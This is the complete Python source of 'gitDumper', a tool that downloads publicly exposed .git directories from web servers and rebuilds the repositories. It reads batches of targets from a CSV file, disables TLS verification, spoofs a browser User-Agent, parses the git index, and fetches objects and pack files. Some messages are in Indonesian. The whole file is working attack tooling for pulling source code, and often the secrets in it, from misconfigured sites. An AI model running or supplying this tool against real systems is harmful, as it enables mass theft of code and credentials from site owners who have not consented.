import os, sys, re, struct, binascii, mmap, logging, concurrent.futures, subprocess, csv, argparse
from urllib3.exceptions import InsecureRequestWarning
from logging import Handler
from urllib.parse import urlparse


class AutoImporter:
    def __init__(self):
        self.installed = set()

    def install(self, package):
        if package not in self.installed:
            print(f"⚠️ [AutoInstaller] Installing missing package: {package}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            self.installed.add(package)

    def try_import(self, package_name, import_as=None, from_import=None):
        try:
            if from_import:
                module = __import__(from_import[0], fromlist=[from_import[1]])
                globals()[from_import[1]] = getattr(module, from_import[1])
            elif import_as:
                module = __import__(package_name)
                globals()[import_as] = module
            else:
                module = __import__(package_name)
                globals()[package_name] = module
        except ImportError:
            self.install(package_name)
            self.try_import(package_name, import_as, from_import)


# Auto-importer instance
auto = AutoImporter()

# External modules
auto.try_import("requests")
auto.try_import("tqdm", from_import=("tqdm", "tqdm"))
auto.try_import("rich", from_import=("rich.logging", "RichHandler"))
auto.try_import("rich", from_import=("rich.console", "Console"))

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class TqdmLoggingHandler(Handler):
    def emit(self, record):
        try:
            msg = self.format(record)
            tqdm.write(msg)
            self.flush()
        except Exception:
            self.handleError(record)

class Config:
    FILE_NAMES = [
        "index", "FETCH_HEAD", "HEAD", "ORIG_HEAD", "config", "description",
        "packed-refs", "info/exclude", "info/refs", "logs/HEAD",
        "logs/refs/heads/develop", "logs/refs/heads/master",
        "logs/refs/remotes/origin/develop", "logs/refs/remotes/origin/step_develop",
        "logs/refs/remotes/origin/master", "logs/refs/remotes/github/master",
        "refs/heads/develop", "refs/heads/master", "refs/remotes/origin/develop",
        "refs/remotes/origin/master", "refs/remotes/origin/step_develop",
        "refs/remotes/github/master", "objects/info/packs", "refs/remotes/origin/HEAD"
    ]

    DIR_NAMES = [
        "info", "logs", "logs/refs", "logs/refs/heads", "logs/refs/remotes",
        "logs/refs/remotes/github", "logs/refs/remotes/origin", "refs",
        "refs/heads", "refs/remotes", "refs/remotes/origin", "refs/remotes/github",
        "refs/tags", "objects", "objects/info", "objects/pack"
    ]

    HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/88.0.4324.96 Safari/537.36'
    }

    SHA1_FILES = [
        "HEAD", "logs/HEAD", "logs/refs/heads/master",
        "logs/refs/remotes/github/master", "packed-refs", "ORIG_HEAD",
        "info/refs", "refs/heads/master", "refs/remotes/github/master",
        "refs/remotes/origin/HEAD"
    ]


# Setup logging
console = Console()
log = logging.getLogger("gitdumper")
log.setLevel(logging.INFO)
log.handlers.clear()
formatter = logging.Formatter("[%(asctime)3s] [%(levelname)-3s] %(message)s")

# Custom handler
tqdm_handler = TqdmLoggingHandler()
tqdm_handler.setFormatter(formatter)

log.addHandler(tqdm_handler)


class GitIndexParser:
    def __init__(self, index_path):
        self.index_path = index_path

    @staticmethod
    def _validate(condition, message):
        if not condition:
            raise ValueError(message)

    def parse(self):
        with open(self.index_path, "rb") as f:
            mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
            try:
                signature = mm.read(4).decode('ascii')
                self._validate(signature == 'DIRC', "Invalid index file signature")
                version = struct.unpack('!I', mm.read(4))[0]
                self._validate(version in {2, 3}, f"Unsupported version: {version}")
                entry_count = struct.unpack('!I', mm.read(4))[0]

                for _ in range(entry_count):
                    entry = self._parse_entry(mm, version)
                    if entry.get('sha1'):
                        yield entry['sha1']
            finally:
                mm.close()

    def _parse_entry(self, mm, version):
        entry = {}
        mm.read(40)  # skip metadata
        entry['sha1'] = binascii.hexlify(mm.read(20)).decode('ascii')
        flags = struct.unpack('!H', mm.read(2))[0]
        namelen = flags & 0xfff
        if version == 3 and (flags & 0x8000):
            mm.read(2)
        mm.read(namelen + (8 - (62 + namelen) % 8))
        return entry


class GitDumper:
    def __init__(self, url, output_folder="output"):
        self.base_url = self._normalize_url(url)
        self.output_folder = output_folder
        self.session = requests.Session()
        self.session.headers.update(Config.HEADERS)
        self.session.verify = False

    @staticmethod
    def _normalize_url(url):
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = f'http://{url}'
        if '.git' not in url:
            url = f'{url.rstrip("/")}/.git/'
        return url if url.endswith('/') else f'{url}/'

    def _create_directories(self):
        base_path = os.path.join(self.output_folder, '.git')
        os.makedirs(base_path, exist_ok=True)
        for dir_name in Config.DIR_NAMES:
            os.makedirs(os.path.join(base_path, dir_name), exist_ok=True)
        for i in range(256):
            os.makedirs(os.path.join(base_path, 'objects', f'{i:02x}'), exist_ok=True)

    def _download_file(self, file_path):
        url = self.base_url + file_path
        local_path = os.path.join(self.output_folder, '.git', file_path)

        if os.path.exists(local_path):
            return False

        try:
            response = self.session.get(url, allow_redirects=False, timeout=10)
            if response.status_code == 200 and not self._is_html(response.content):
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                with open(local_path, 'wb') as f:
                    f.write(response.content)
                return True
        except Exception as e:
            log.warning(f"⚠️ Error downloading {url}: {str(e)}")
        return False

    @staticmethod
    def _is_html(content):
        return any(tag in content[:1024].decode('utf-8', errors='ignore').lower()
                   for tag in ('<!doctype html>', '<html>'))

    def _download_batch(self, file_list):
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = {executor.submit(self._download_file, f): f for f in file_list}
            for future in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="📥 Downloading"):
                file_path = futures[future]
                try:
                    if future.result():
                        log.info(f"✅ Downloaded: {file_path}")
                except Exception as e:
                    log.warning(f"⚠️ Error processing {file_path}: {str(e)}")

    def _extract_sha1_from_file(self, git_path):
        full_path = os.path.join(self.output_folder, '.git', git_path)
        if not os.path.exists(full_path):
            return []
        with open(full_path, 'r', errors='ignore') as f:
            return re.findall(r'\b[0-9a-f]{40}\b', f.read())

    def _get_all_sha1(self):
        sha1_list = []
        index_path = os.path.join(self.output_folder, '.git', 'index')
        if os.path.exists(index_path):
            try:
                parser = GitIndexParser(index_path)
                sha1_list = list(parser.parse())
            except Exception as e:
                log.warning(f"⚠️ Error parsing index: {str(e)}")

        for file_path in Config.SHA1_FILES:
            hashes = self._extract_sha1_from_file(file_path)
            log.debug(f"📄 {file_path} → {len(hashes)} SHA1")
            sha1_list += hashes

        unique = list(set(sha1_list))
        log.info(f"📌 Total SHA1 collected: {len(unique)}")
        return unique

    def _download_objects(self, sha1_list):
        object_paths = [f'objects/{s[:2]}/{s[2:]}' for s in sha1_list]
        self._download_batch(object_paths)

    def _process_packs(self):
        packs_path = os.path.join(self.output_folder, '.git', 'objects', 'info', 'packs')
        if not os.path.exists(packs_path):
            return
        with open(packs_path, 'r') as f:
            for line in f:
                if line.startswith('P '):
                    pack_name = line.strip().split()[-1]
                    for ext in ['pack', 'idx']:
                        path = f'objects/pack/{pack_name}.{ext}'
                        self._download_file(path)

    def run(self):
        log.info(f"🎯 Target URL: {self.base_url}")
        self._create_directories()
        log.info("📁 Downloading basic files...")
        self._download_batch(Config.FILE_NAMES)
        log.info("🔍 Extracting SHA1 hashes...")
        sha1_list = self._get_all_sha1()
        log.info(f"🧩 Found {len(sha1_list)} unique SHA1 hashes")
        log.info("⬇️ Downloading objects...")
        self._download_objects(sha1_list)
        log.info("📦 Checking for pack files...")
        self._process_packs()
        log.info("✅ Operation completed!")
        log.info(f"💡 To restore repository:\ncd {self.output_folder} && git checkout -- .")




def parse_args():
    parser = argparse.ArgumentParser(description="gitDumper - Download and restore exposed .git folders.")
    parser.add_argument("input", help="Target URL atau path ke file CSV")
    parser.add_argument("--kolom", default="Git URL", help="Nama kolom yang berisi URL (wajib jika input CSV)")
    parser.add_argument("--statuscode", default="200", help="Filter baris CSV berdasarkan kolom 'Status Code' (default: 200)")
    return parser.parse_args()

def get_urls_from_csv(csv_path, kolom, status_filter):
    urls = []
    try:
        with open(csv_path, newline='', encoding='utf-8') as csvfile:
            reader = csv.DictReader(csvfile)
            if not reader.fieldnames:
                log.error("❌ CSV kosong atau tidak valid.")
                sys.exit(1)

            if kolom not in reader.fieldnames or 'Status Code' not in reader.fieldnames:
                log.error("❌ Kolom yang dibutuhkan tidak ditemukan di CSV.")
                sys.exit(1)

            for row in reader:
                if row.get("Status Code", "").strip() == status_filter:
                    url = row.get(kolom)
                    if url:
                        urls.append(url.strip())
    except Exception as e:
        log.error(f"❌ Gagal membaca CSV: {e}")
        sys.exit(1)

    return urls

def extract_output_folder(url):
    parsed = urlparse(url)
    return parsed.netloc

def main():
    args = parse_args()

    if args.input.lower().endswith(".csv"):
        urls = get_urls_from_csv(args.input, args.kolom, args.statuscode)
        if not urls:
            log.warning("⚠️ Tidak ada URL yang sesuai dengan filter status code.")
            sys.exit(0)

        for url in urls:
            output_dir = extract_output_folder(url)
            log.info(f"🚀 Memulai dump untuk: {url} → 📁 {output_dir}")
            dumper = GitDumper(url, output_dir)
            dumper.run()
    else:
        url = args.input
        output_dir = extract_output_folder(url)
        log.info(f"🚀 Memulai dump untuk: {url} → 📁 {output_dir}")
        dumper = GitDumper(url, output_dir)
        dumper.run()


if __name__ == "__main__":
    main()
